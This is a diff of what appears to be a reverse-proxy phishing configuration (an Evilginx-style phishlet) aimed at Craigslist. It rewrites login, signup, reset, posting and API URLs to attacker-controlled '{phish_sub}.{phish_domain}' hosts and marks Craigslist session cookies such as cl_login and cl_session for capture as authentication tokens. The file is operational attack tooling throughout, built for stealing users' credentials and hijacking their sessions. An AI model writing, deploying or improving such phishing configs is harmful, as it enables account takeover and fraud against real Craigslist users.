@@ -13,63 +13,58 @@ proxy_hosts:
 
 
 sub_filters:
-  - domain: 'craigslist.org'
-    filters:
-      # Rewrite for accounts.craigslist.org
-      - {triggers_on: 'accounts.craigslist.org', orig_sub: 'accounts', domain: 'craigslist.org', search: 'https://accounts.craigslist.org', replace: 'https://accounts.{phish_sub}.{phish_domain}', mimes: ['text/html']}
-      - {triggers_on: 'accounts.craigslist.org', search: '/login', replace: 'https://accounts.{phish_sub}.{phish_domain}/login', mimes: ['text/html']}
-      - {triggers_on: 'accounts.craigslist.org', search: '/signup', replace: 'https://accounts.{phish_sub}.{phish_domain}/signup', mimes: ['text/html']}
-      - {triggers_on: 'accounts.craigslist.org', search: '/reset', replace: 'https://accounts.{phish_sub}.{phish_domain}/reset', mimes: ['text/html']}
+  # Rewrite for accounts.craigslist.org
+  - {triggers_on: 'accounts.craigslist.org', orig_sub: 'accounts', domain: 'craigslist.org', search: 'https://accounts.craigslist.org', replace: 'https://accounts.{phish_sub}.{phish_domain}', mimes: ['text/html']}
+  - {triggers_on: 'accounts.craigslist.org', orig_sub: 'accounts', domain: 'craigslist.org', search: '/login', replace: 'https://accounts.{phish_sub}.{phish_domain}/login', mimes: ['text/html']}
+  - {triggers_on: 'accounts.craigslist.org', orig_sub: 'accounts', domain: 'craigslist.org', search: '/reset', replace: 'https://accounts.{phish_sub}.{phish_domain}/reset', mimes: ['text/html']}
+  - {triggers_on: 'accounts.craigslist.org', orig_sub: 'accounts', domain: 'craigslist.org', search: '/signup', replace: 'https://accounts.{phish_sub}.{phish_domain}/signup', mimes: ['text/html']}
 
-      # Rewrite for post.craigslist.org
-      - {triggers_on: 'post.craigslist.org', orig_sub: 'post', domain: 'craigslist.org', search: 'https://post.craigslist.org', replace: 'https://post.{phish_sub}.{phish_domain}', mimes: ['text/html']}
-      - {triggers_on: 'post.craigslist.org', search: '/c/lax', replace: '/c/lax', mimes: ['text/html']}
+  # Rewrite for post.craigslist.org
+  - {triggers_on: 'post.craigslist.org', orig_sub: 'post', domain: 'craigslist.org', search: 'https://post.craigslist.org', replace: 'https://post.{phish_sub}.{phish_domain}', mimes: ['text/html']}
+  - {triggers_on: 'post.craigslist.org', orig_sub: 'post', domain: 'craigslist.org', search: '/c/lax', replace: '/c/lax', mimes: ['text/html']}
 
-      # Rewrite for wapi.craigslist.org
-      - {triggers_on: 'wapi.craigslist.org', orig_sub: 'wapi', domain: 'craigslist.org', search: 'https://wapi.craigslist.org', replace: 'https://wapi.{phish_sub}.{phish_domain}', mimes: ['application/json']}
+  # Rewrite for wapi.craigslist.org
+  - {triggers_on: 'wapi.craigslist.org', orig_sub: 'wapi', domain: 'craigslist.org', search: 'https://wapi.craigslist.org', replace: 'https://wapi.{phish_sub}.{phish_domain}', mimes: ['application/json']}
 
-      # Rewrite for capi.craigslist.org
-      - {triggers_on: 'capi.craigslist.org', orig_sub: 'capi', domain: 'craigslist.org', search: 'https://capi.craigslist.org', replace: 'https://capi.{phish_sub}.{phish_domain}', mimes: ['application/json']}
+  # Rewrite for capi.craigslist.org
+  - {triggers_on: 'capi.craigslist.org', orig_sub: 'capi', domain: 'craigslist.org', search: 'https://capi.craigslist.org', replace: 'https://capi.{phish_sub}.{phish_domain}', mimes: ['application/json']}
 
-      # Rewrite for sapi.craigslist.org
-      - {triggers_on: 'sapi.craigslist.org', orig_sub: 'sapi', domain: 'craigslist.org', search: 'https://sapi.craigslist.org', replace: 'https://sapi.{phish_sub}.{phish_domain}', mimes: ['application/json']}
+  # Rewrite for sapi.craigslist.org
+  - {triggers_on: 'sapi.craigslist.org', orig_sub: 'sapi', domain: 'craigslist.org', search: 'https://sapi.craigslist.org', replace: 'https://sapi.{phish_sub}.{phish_domain}', mimes: ['application/json']}
 
-      # Rewrite static links
-      - {triggers_on: 'www.craigslist.org', orig_sub: 'www', domain: 'craigslist.org', search: '/static/www/localStorage', replace: 'https://www.{phish_sub}.{phish_domain}/static/www/localStorage', mimes: ['text/html']}
+  # Rewrite static links
+  - {triggers_on: 'www.craigslist.org', orig_sub: 'www', domain: 'craigslist.org', search: '/static/www/localStorage', replace: 'https://www.{phish_sub}.{phish_domain}/static/www/localStorage', mimes: ['text/html']}
 
-      # Rewrite help pages
-      - {triggers_on: 'www.craigslist.org', search: '/about/help/', replace: '/about/help/', mimes: ['text/html']}
+  # Rewrite help pages
+  - {triggers_on: 'www.craigslist.org', orig_sub: 'www', domain: 'craigslist.org', search: '/about/help/', replace: '/about/help/', mimes: ['text/html']}
 auth_tokens:
-  cookies:
-    - name: 'cl_b'
-      domain: 'craigslist.org'
-      is_auth_token: false
-    - name: 'cl_def_hp'
-      domain: 'craigslist.org'
-      is_auth_token: false
-    - name: 'cl_login'
-      domain: 'accounts.craigslist.org'
-      is_auth_token: true
-    - name: 'cl_session'
-      domain: 'accounts.craigslist.org'
-      is_auth_token: false
-  headers:
-    - name: 'User-Agent'         # Forward the original user-agent
-      is_auth_token: false
-    - name: 'Accept-Language'    # Forward the accept-language header
-      is_auth_token: false
-    - name: 'Referer'            # Forward the referer to maintain browsing context
-      is_auth_token: false
-    - name: 'Sec-Fetch-Site'     # Forward security fetch headers
-      is_auth_token: false
-    - name: 'Sec-Fetch-Mode'     # Forward fetch mode header
-      is_auth_token: false
-    - name: 'Sec-Fetch-Dest'     # Forward fetch destination header
-      is_auth_token: false
-    - name: 'Accept-Encoding'    # Forward the accepted encoding
-      is_auth_token: false
-    - name: 'Sec-Ch-Ua'          # Foward
-      is_auth_token: false
+  - domain: .craigslist.org
+    keys:
+      - cl_b
+      - cl_def_hp
+    type: cookie
+    session_keys:
+      - cl_b
+      - cl_def_hp
+  - domain: .accounts.craigslist.org
+    keys:
+      - cl_login
+      - cl_session
+    type: cookie
+    session_keys:
+      - cl_session
+  - domain: .craigslist.org
+    keys:
+      - User-Agent
+      - Accept-Language
+      - Referer
+      - Sec-Fetch-Site
+      - Sec-Fetch-Mode
+      - Sec-Fetch-Dest
+      - Accept-Encoding
+      - Sec-Ch-Ua
+    type: header
+
 
 credentials:
   username:
